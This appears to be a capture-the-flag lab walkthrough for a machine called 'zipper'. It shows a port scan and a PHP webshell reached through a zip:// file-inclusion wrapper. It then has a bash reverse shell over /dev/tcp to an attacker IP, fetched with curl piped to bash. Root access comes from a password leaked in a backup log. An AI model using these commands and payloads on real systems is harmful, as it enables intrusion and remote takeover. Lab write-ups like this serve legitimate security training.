`Running all scans on 192.168.217.229`

`Host is likely running Unknown OS!`

`---------------------Starting Port Scan-----------------------`

`PORT   STATE SERVICE`
`22/tcp open  ssh`
`80/tcp open  http`

Check out the web server

![[Pasted image 20240222195706.png]]

So we can upload files but they get zipped

If we mouse over the home button in the top left corner we can see how files can be accessed.
![[Pasted image 20240222195831.png]]

Looking at HackTricks we can see there is a wrapper that unzips files so you can access them.
https://book.hacktricks.xyz/pentesting-web/file-inclusion (search for `zip://` on that page)

Let's see if we can reproduce this
`└─$ cat basic_php_webshell.php` 
`<?php echo system($_GET['cmd']); ?>`

Upload this file and copy the link it gives you
http://192.168.217.229/index.php?file=zip://uploads/upload_1708647079.zip%23basic_php_webshell&cmd=whoami

![[Pasted image 20240222200140.png]]

This seems to be working so what if we make a reverse shell and execute that
`└─$ cat shell.sh` 
`bash -c 'bash -i >& /dev/tcp/192.168.45.222/443 0>&1'`

Host this on the attack host's webserver and setup a nc listener
`└─$ nc -nlvp 443` 
`Ncat: Version 7.94SVN ( https://nmap.org/ncat )`
`Ncat: Listening on [::]:443`
`Ncat: Listening on 0.0.0.0:443

`└─$ python -m http.server 80`                                           
`Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...`
`192.168.217.229 - - [22/Feb/2024 19:22:11] "GET /shell.sh HTTP/1.1" 200 -`

Change our command and execute
`http://192.168.217.229/index.php?file=zip://uploads/upload_1708647079.zip%23basic_php_webshell&cmd=curl%20192.168.45.222/shell.sh%20|%20bash`

`└─$ nc -nlvp 443` 
`Ncat: Version 7.94SVN ( https://nmap.org/ncat )`
`Ncat: Listening on [::]:443`
`Ncat: Listening on 0.0.0.0:443`
`Ncat: Connection from 192.168.217.229:42552.`
`bash: cannot set terminal process group (960): Inappropriate ioctl for device`
`bash: no job control in this shell`
`www-data@zipper:/var/www/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'`
`<ml$ python3 -c 'import pty; pty.spawn("/bin/bash")'`
`www-data@zipper:/var/www/html$` 

Looking at crontab we can see a backup script executes as root
```
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/backup.sh

```

See what this backup script does
`www-data@zipper:/var/www/html$ cat /opt/backup.sh`
`cat /opt/backup.sh`
`#!/bin/bash`
`password=cat /root/secret`
`cd /var/www/html/uploads`
`rm *.tmp`
`7za a /opt/backups/backup.zip -p$password -tzip *.zip > /opt/backups/backup.logwww-data@zipper:/var/www/html$ ls /opt/backups`

It backs everything in the uploads folder up with a root secret and also produces a log file.
Let's check the log file.
```
www-data@zipper:/var/www/html$ cat /opt/backups/backup.log
cat /opt/backups/backup.log

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU AMD EPYC 7371 16-Core Processor                 (800F12),ASM,AES-NI)

Open archive: /opt/backups/backup.zip
--
Path = /opt/backups/backup.zip
Type = zip
Physical Size = 482901

Scanning the drive:
5 files, 482189 bytes (471 KiB)

Updating archive: /opt/backups/backup.zip

Items to compress: 5


Files read from disk: 5
Archive size: 482901 bytes (472 KiB)

Scan WARNINGS for files and folders:

WildCardsGoingWild : No more files
----------------
Scan WARNINGS: 1

```

This `WildCardsGoingWild` looks a little suspicious. Is it our password?

`www-data@zipper:/var/www/html$ su root`
`su root`
`Password: WildCardsGoingWild`

`root@zipper:/var/www/html#`

Collect the flags
`root@zipper:~# cat /root/proof.txt`
`cc078fb0999a532d68ff279d5a3da296`
`root@zipper:~# find / -name local.txt 2>/dev/null`
`/var/www/local.txt`
`root@zipper:~# cat /var/www/local.txt`
`fae5f3610b6014c67c091aa2c18a3ae3`



